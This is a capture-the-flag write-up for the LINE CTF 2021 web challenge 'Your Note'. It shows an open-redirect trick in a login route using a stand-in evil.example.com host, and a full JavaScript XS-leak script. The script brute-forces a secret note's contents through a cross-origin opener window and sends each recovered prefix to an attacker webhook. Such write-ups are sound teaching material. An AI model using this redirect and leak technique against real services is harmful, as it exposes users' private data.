# LINE CTF 2021 - Web - Your Note

## Problem

> Secure private note service  
  
> ※ Admin have disabled some security feature of their browser...  
>  
> Flag Format: LINECTF{[a-z0-9-]+}  
>  
> http:// 34.84.243.202  
  
> http:// 35.200.11.35 (mirror)  
  
> http:// 34.84.72.167 (mirror)

## Solution

### Step 1. Redirect to an arbitrary URL

The login API is as follows:  
```python  
@app.route('/login', methods=['GET', 'POST'])  
def login():  
   url = request.args.get('redirect')  
   if url:  
       url = app.config.get('BASE_URL') + url  
       if current_user.is_authenticated:  
           return redirect(url)

   if request.method == 'POST':  
       # -- snip --

   elif request.method == 'GET':  
       return render_template('login.html')  
```

This API provides a redirect to `app.config.get('BASE_URL') +
request.args.get('redirect')`, where `BASE_URL = f"http://{APP_HOST}"`.

Then, if we send `http://34.84.72.167/[email protected]` to the bot, the
redirect url is `http://{APP_HOST}@evil.example.com`. So, we can make the bot
redirect to an arbitary URL because `{APP_HOST}` is interpreted as a user name
in the URL.

### Step 2. Specify the flag with `window.opener`

A part of `crawler.js` is as follows:  
```javascript  
       /* -- snip -- */

       const browser = await puppeteer.launch({  
           args: [  
               '--no-sandbox',  
               '--disable-popup-blocking',  
           ],  
           headless: true,  
       });  
       const page = await browser.newPage();

       /* -- snip -- */  
```

The `--disable-popup-blocking` option enables us to use `window.open`.

So, I prepared the following attack server:

- `index.html`:  
   ```html  
   <script>  
     window.open("evil.html");  
   </script>  
   ```  
- `empty.html`:  
   ```html

   ```  
- `evil.html`  
   ```html  
   <script>  
   const url = "http://34.84.72.167";  
   const webhook = "https://{{ ... }}";  
   const chars = "}-abcdefghijklmnopqrstuvwxyz0123456789";  
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

   const main = async () => {  
     await sleep(200);

     window.open(`${webhook}/ping`);

     let prefix = "LINECTF{";

     while (true) {  
       if (prefix.endsWith("}")) {  
         break;  
       }  
       window.open(`${webhook}/prefix/${prefix}`);

       await sleep(200);  
       let exists = false;  
       for (const c of chars) {

         window.opener.location.href = `/empty.html`;  
         await sleep(200);  
         window.opener.location.href = `${url}/search?q=${prefix + c}&download`;  
         await sleep(500);

         try {  
           console.log(window.opener.document.body.textContent);  
           prefix += c;  
           exists = true;  
           break;  
         } catch (e) { }  
       }  
       if (!exists) {  
         window.open(`${webhook}/fail/${prefix}`);  
         return;  
       }  
     }  
     window.open(`${webhook}/success/${prefix}`);  
   };  
   main();  
   </script>  
   ```

If a user who has a note with a flag `LINECTF{[a-z0-9-]+}` accesses
`index.html`, the flag is leaked in order from the first character. This is a
XS-leak attack with Cross-Origin-Opener-Policy.

This attack was successful in my local environment. However, unfortunately,
because the problem server was unstable, I got the flag by adjusting the sleep
times and saving the search range at that point :(

## Flag

`LINECTF{1-kn0w-what-y0u-d0wn10ad}`  

Original writeup
(https://github.com/x-vespiary/writeup/blob/master/2021/03-line/web-your-
note.md).